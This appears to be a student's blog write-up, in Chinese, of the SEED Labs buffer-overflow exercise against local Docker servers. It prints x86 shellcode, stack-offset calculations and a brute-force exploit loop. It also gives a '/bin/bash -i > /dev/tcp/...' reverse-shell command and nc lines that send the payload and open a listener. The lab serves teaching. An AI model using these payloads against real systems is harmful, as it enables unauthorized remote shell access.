@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="airhaohan">
+    
+    <title>
+        
+            SEEDLabs Buffer Overflow |
+        
+        Splendid
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/null">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/profile.jpg","favicon":null,"article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"计院人的2+X就是2+Labs+PJs+Reports🙋‍♂️"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Splendid
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">SEEDLabs Buffer Overflow</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/profile.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">airhaohan</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-10-11 16:10:00</span>
+        <span class="mobile">2022-10-11 16:10</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Security/">Security</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Security/">Security</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SEEDLabs/">SEEDLabs</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="SEEDLabs-Buffer-Overflow"><a href="#SEEDLabs-Buffer-Overflow" class="headerlink" title="SEEDLabs Buffer Overflow"></a>SEEDLabs Buffer Overflow</h1><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>攻击目标代码中含有以下代码片段：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">bof</span><span class="params">(<span class="type">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">fread</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, stdin);</span><br><span class="line">    <span class="built_in">bod</span>(str);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>fread()</code> 有长度限制，因此能保证 <code>str</code> 从 <code>stdin</code> 中读取 517 个字节；但函数 <code>int bof(char*)</code> 中，<code>strcpy()</code> 并不会考虑长度限制，因此本来准备写入 <code>buffer</code> 的数据很有可能大于其长度，造成对栈上邻近 <code>buffer</code> 的更高地址的数据被覆盖；因此，我们只需要合理安排 <code>str</code> 中的内容，填充合适的代码片段，并修改 <code>bof()</code> 函数的返回地址，就可以达到劫持控制流的目标。</p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>① 首先，使用 <code>SEED-Ubuntu20.04.vdi</code> 镜像创建虚拟机，虚拟机内已装好相关应用程序，需要自行安装 vscode 等 IDE。</p>
+<p>② 接着，需要在 <code>server-code</code> 中依据 <code>Makefile</code> 编译服务器代码 <code>stack.c</code> 和 <code>server.c</code> ，并将可执行文件复制到 <code>bof-containers</code> 中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make install</span></span><br></pre></td></tr></table></figure>
+<p>③ 最后，需要使用 <code>docker-compose.yml</code> 配置并启动 docker container</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dcbuild</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dcup</span></span><br></pre></td></tr></table></figure>
+<p>拉取 docker 镜像的时候，出现了：</p>
+<ul>
+<li><p>虚拟机无法上网。经过排查是由于宿主机连接的是宿舍的网络（不清楚什么原理，可能是因为宿舍的网络需要登陆验证，比较特殊？），换成手机热点即可解决。</p>
+</li>
+<li><p>速度过慢。这时候需要更改 docker 镜像源为国内的镜像源，即在 <code>/etc/docker/daemon.json</code> 中加入（需要 root 用户权限，且 <code>daemon.json</code> 文件在刚安装 docker 时是不存在的，需要创建）：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://&lt;docker-mirror-1&gt;&quot;,</span><br><span class="line">    &quot;https://&lt;docker-mirror-2&gt;&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>④ 此外，在做前几个 Task 时，需要关闭地址随机化以降低难度：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure>
+<p>若设为 1 则对栈进行地址随机化；若设为 2 则对堆和栈都进行地址随机化。</p>
+<h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><p><strong>实验目标</strong>：熟悉 shellcode；</p>
+<p><strong>实验步骤</strong>：</p>
+<p>① 上方的二进制指令会将下面的指令作出处理，<code>/bin/bash</code> 相当于开了一个新的 shell；第三行是列出当前文件夹下所有文件信息、打印 “Hello 32/64” 和查看 <code>/etc/passwd</code> 文件的后两行</p>
+<p>可以将第三行替换为自己想要执行的 shellcode，但是总的长度不能变：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>② 分别运行 <code>shellcode_32.py</code> 和 <code>shellcode_64</code> ，产生名为 <code>codefile_32</code> 和 <code>codefile_64</code> 的文件，分别对应 32 位系统和 64 位系统的 shellcode 的二进制表示：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./shellcode_32.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./shellcode_64.py</span></span><br></pre></td></tr></table></figure>
+<p>常常出现文件权限或用户权限（Permission denied）不够的情况，可以更改文件权限或切换到 root 用户：<br><img src="https://img-blog.csdnimg.cn/39eb2665b48d42c48e1dbf1fc82aba21.jpeg" alt="请添加图片描述"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 777 shellcode_32.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su</span></span><br></pre></td></tr></table></figure>
+<p>③ 使用 <code>Makefile</code> 分别将 <code>codefile_32</code> 和 <code>codefile_64</code> 交给 <code>call_shellcode.c</code> 运行，<code>call_shellcode.c</code> 只是将二进制文件强制转换成函数指针并运行：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;codefile_64&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;codefile_32&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">	<span class="built_in">int</span> (*func)() = (<span class="built_in">int</span>(*)())code;</span><br><span class="line">    <span class="built_in">func</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终输出为 <code>a32.out</code> 和 <code>a64.out</code> ，执行这两个文件产生以下现象：</p>
+<p><img src="https://img-blog.csdnimg.cn/9bbb653607ff40cd9552c52d769df9af.jpeg" alt="请添加图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/bf7d048b5e744809a352a0402910c0f4.jpeg" alt="请添加图片描述"></p>
+<p>可以看到当前文件夹下所有文件信息、“Hello 32/64” 和 <code>/etc/passwd</code> 文件的后两行</p>
+<h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p><strong>实验目标：</strong> 对 32 位的目标服务器 10.9.0.5 的 bof 进行攻击，达到 reverse shell 的目的（已知 <code>%ebp</code> 和 buffer 地址）</p>
+<p><strong>实验方案：</strong> 已知 <code>%ebp</code> 和 buffer 地址，就可以通过计算 return address 的位置，达到劫持控制流的目的。</p>
+<p><strong>实验步骤：</strong></p>
+<p>① 对服务器发送无关的 shellcode，获得其 <code>%ebp</code> 地址和 buffer 的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello | nc 10.9.0.5 9090</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/70687344d42c423abefef9c802e0d995.png" alt="请添加图片描述"></p>
+<p>可以看到 <code>%ebp</code> 地址为 <code>0xffffd148</code> ，buffer 起始地址为 <code>0xffffd0d8</code> ，间隔 <code>0x70</code> </p>
+<p>② 获得地址后，计算 <code>exploit.py</code> 中相关参数的大小：</p>
+<ul>
+<li><p>start：由于 shellcode比较长，如果设置在比返回地址更低的位置，则会覆盖掉返回地址；因此，我选择了 120（0x78）的位置，即返回地址高地址方向的下一个位置</p>
+</li>
+<li><p>ret：受到 start 的约束，ret 为返回地址高地址方向的下一个位置，即 <code>%ebp + 8</code> ，为 <code>0xffffd150</code> </p>
+</li>
+<li><p>offset：由于 <code>%ebp</code> 往后 4B 的位置时返回地址，因此 offset 为 0x70 + 4 = 0x74（116）</p>
+</li>
+<li><p>IP：通过 <code>ifconfig</code> 得到本机IP地址为 10.9.0.1，因此 shellcode 第三行应改为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/75f092e6acbb48149346f37cbeb9ff47.png" alt="请添加图片描述"></p>
+<p>③ 运行 <code>exploit.py</code> ，生成 <code>badfile</code> ，包含攻击代码的二进制形式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./exploit.py</span></span><br></pre></td></tr></table></figure>
+<p>④ 将 <code>badfile</code> 传给 10.9.0.5 的 9090 端口作为输入，同时开启另一个窗口监听 9090 端口，以观察是否 reverse 成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> badfile | nc 10.9.0.5 9090</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -nv -l 9090</span></span><br></pre></td></tr></table></figure>
+<p>可以看到监听窗口开启了一个来自 10.9.0.5  的 shell：</p>
+<p><img src="https://img-blog.csdnimg.cn/a9ea8172ddf8498fbf17225a73093abd.jpeg" alt="请添加图片描述"></p>
+<p>查看 10.9.0.5 的 docker ID ，确实是 23c5636c5b14，说明攻击成功：</p>
+<p><img src="https://img-blog.csdnimg.cn/f604a95b12a9423b80ec82b320a80885.png" alt="请添加图片描述"></p>
+<p><strong>遇到的问题：</strong> 实验中，我以为之前关闭了地址随机化，并且计算正确，但是每次都不成功；后来发现每次重启虚拟机时地址随机化的设置都会重置，需要手动重新关闭；所以每次显示的 <code>%ebp</code> 和 buffer 的地址实际上是上一次栈的内存布局，当然无法成功。事实上，当地址随机化被关闭时，只要 docker container 不重启，则每次 crash down 之后栈的布局都会保持不变。</p>
+<h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p><strong>实验目标</strong>：对 32 位的目标服务器 10.9.0.6 的 bof 进行攻击，达到 reverse shell 的目的（已知 buffer 地址和 buffer 大小范围为 [100, 300]）</p>
+<p><strong>实验方案</strong>：在未知 <code>%ebp</code> 地址的情况下，无法正确定位返回地址的位置，因此采用的方案是在 <code>str</code> 中填充大量 entry address，以达到增大命中率的目的。</p>
+<p><strong>实验步骤：</strong></p>
+<p>① 对服务器发送无关的 shellcode，获得其 buffer 的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello | nc 10.9.0.6 9090</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/6b571ab112264ff89c730de0998c23c8.png" alt="请添加图片描述"></p>
+<p>② 获得地址后，计算 <code>exploit.py</code> 中相关参数的大小：</p>
+<ul>
+<li>start： 已知 buffer 大小范围为 [100, 300] ，故选择从 buffer 起始位置向高地址方向偏移300 的地址作为攻击代码的起始地址（shellcode 长度为 137，而 300 + 137 &lt; 517，可以保证存下所有shellcode）</li>
+<li>ret：受到 start 的约束，ret 为 buffer 地址向高地址方向偏移 start ，即 <code>0xffffcfb8 + start</code> </li>
+<li>IP：通过 <code>ifconfig</code> 得到本机IP地址为 10.9.0.1</li>
+</ul>
+<p>③ 通过循环将 shellcode 之前的内容全部填充上 ret：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content_to_fill =  (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, start, <span class="number">4</span>):</span><br><span class="line">    content[i:i+<span class="number">4</span>] = content_to_fill</span><br></pre></td></tr></table></figure>
+<p>④ 生成 <code>badfile</code> 并传给 10.9.0.6 的 9090 端口作为输入，同时开启另一个窗口监听 9090 端口，以观察是否 reverse 成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./exploit.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> badfile | nc 10.9.0.6 9090</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -nv -l 9090</span></span><br></pre></td></tr></table></figure>
+<p>可以看到监听窗口开启了一个来自 10.9.0.6  的 shell：</p>
+<p><img src="https://img-blog.csdnimg.cn/8b5a8db40fcb4b92a8ffeb47f3a0aee8.png" alt="请添加图片描述"></p>
+<p>查看 10.9.0.6 的 docker ID ，确实是 e7c33d4e511d，说明攻击成功：</p>
+<p><img src="https://img-blog.csdnimg.cn/b8ba488d520947efab2239439dad7323.png" alt="请添加图片描述"></p>
+<h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><p><strong>实验目标：</strong> 对 64 位的目标服务器 10.9.0.7 的 bof 进行攻击，达到 reverse shell 的目的（已知 <code>%rbp</code> 和 buffer 地址，但需要解决 <code>strcpy()</code> 遇到 64 位地址高两位 0 时停止的问题）</p>
+<p><strong>实验方案：</strong> 由于 X86 是小端模式，因此将 ret 以小端形式转为二进制码时，\x00 实际上在后边（对应着地址的低位），所以应当将 shellcode 放在返回地址的前面（向地址低位的方向），这样才保证 shellcode 被写到栈上；而原来在栈上的返回地址高位同样为 0，因此和 ret 的低位拼接起来以后仍然得到正确的 ret</p>
+<p><img src="https://img-blog.csdnimg.cn/bc00e705cd5a47edb363c53510fec3a5.jpeg" alt="请添加图片描述"></p>
+<p><strong>实验步骤：</strong></p>
+<p>① 对服务器发送无关的 shellcode，获得其 buffer 的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello | nc 10.9.0.7 9090</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/a53766f457634101b935aba2f196da9e.png" alt="请添加图片描述"></p>
+<p>② 获得地址后，计算 <code>exploit.py</code> 中相关参数的大小：</p>
+<ul>
+<li>start：shellcode 应在返回地址之前（向高地址方向），而shellcode 长度为 164，因此只能设为 0（因为 buffer 到返回地址的间距正好是 164，如果 start 大于 0，则 ret 会覆盖掉 shellcode）</li>
+<li>ret：因为 start 为 0，因此 entry point 就是 buffer 的地址，因此是 <code>0x7fffffffe49</code> </li>
+<li>offset：因为 ret 就是 buffer 的地址，因此 offset 为 <code>%rbp - bof + 8</code> </li>
+<li>IP：通过 <code>ifconfig</code> 得到本机IP地址为 10.9.0.1</li>
+</ul>
+<p>③ 生成 <code>badfile</code> 并传给 10.9.0.6 的 9090 端口作为输入，同时开启另一个窗口监听 9090 端口，以观察是否 reverse 成功：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./exploit.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> badfile | nc 10.9.0.7 9090</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -nv -l 9090</span></span><br></pre></td></tr></table></figure>
+<p>可以看到监听窗口开启了一个来自 10.9.0.7  的 shell：</p>
+<p><img src="https://img-blog.csdnimg.cn/f2edbd41d3b84ca6b0ccaf8a5ac4189a.png" alt="请添加图片描述"></p>
+<p>查看 10.9.0.6 的 docker ID ，确实是 227a67ed3935，说明攻击成功：</p>
+<p><img src="https://img-blog.csdnimg.cn/778994cb01b748f99b114faa8a5d09ca.png" alt="请添加图片描述"></p>
+<h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><p><strong>实验目标：</strong> 对 64 位的目标服务器 10.9.0.8 的 bof 进行攻击，达到 reverse shell 的目的（已知 <code>%rbp</code> 和 buffer 地址，但需要解决 buffer 较小的问题）</p>
+<p><strong>实验方案：</strong> 因为 buffer 较小，所以无法将 shellcode 放在返回地址之前；而将 shellcode 放在返回地址之后，又会因为 64位地址高位的 0 而使得 <code>strcpy()</code> 无法复制到 shellcode 部分就提前结束了。所以依靠 buffer 进行攻击；</p>
+<p>注意到，fread 不会因为 64位地址高位的 0 而停止，因此 <code>str</code> 中的返回地址和 shellcode 都是完整的，可以使用暴力的方法猜测 <code>main</code> 函数中的 <code>str</code> 地址</p>
+<p><strong>实验步骤：</strong></p>
+<p>① 对服务器发送无关的 shellcode，获得其 buffer 的地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello | nc 10.9.0.8 9090</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/762f1bd0565a40ed9e5479b923341729.png" alt="请添加图片描述"></p>
+<p>② 获得地址后，计算 <code>exploit.py</code> 中相关参数的大小：</p>
+<ul>
+<li><p>IP：通过 <code>ifconfig</code> 得到本机IP地址为 10.9.0.1</p>
+</li>
+<li><p>start：因为要将 shellcode 放在返回地址之后，并且要在 shellcode 之前保留尽可能多的 NOP 指令，这样命中的可能性比较大（fengshui）。因此我将 shellcode 放入 content 的最后，即 <code>start = 517 - len(shellcode)</code> </p>
+</li>
+<li><p>offset：<code>%rbp - buffer + 8 = 104</code> </p>
+</li>
+<li><p>ret：初始值为 <code>%rbp</code> 的位置。由于返回地址到 start 之间的间距为：</p>
+<script type="math/tex; mode=display">
+517(str) - 164(shellcode)- 104(offset)- 8(返回地址)= 241</script><p>因此我把步长设置为 40（8 的倍数），并循环若干次：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ret = <span class="number">0x00007fffffffe710</span> <span class="comment"># %rbp 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">   ret += <span class="number">40</span>	<span class="comment"># 步长为 40</span></span><br><span class="line">   content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:	<span class="comment"># 生成 badfile</span></span><br><span class="line">      f.write(content)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;%#x&quot;</span>%ret)</span><br><span class="line">   <span class="built_in">print</span>(os.system(<span class="string">&quot;cat badfile | nc 10.9.0.8 9090&quot;</span>))	<span class="comment"># 将 badfile 输入给 10.9.0.8</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>③ 打开监听，运行 <code>exploit.py</code> ，发现在循环到某个地址时程序阻塞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nv -l 9090</span><br><span class="line">$ ./exploit.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/16347f951922469880af8a2b6f80760a.png" alt="请添加图片描述"></p>
+<p>而此时监听窗口也出现了 10.9.0.8 的 shell：</p>
+<p><img src="https://img-blog.csdnimg.cn/9b0f8983f65c4bb88f33ac674b6e77b0.png" alt="请添加图片描述"></p>
+<p>查看 10.9.0.6 的 docker ID ，确实是 18d8f2697e23，说明攻击成功：</p>
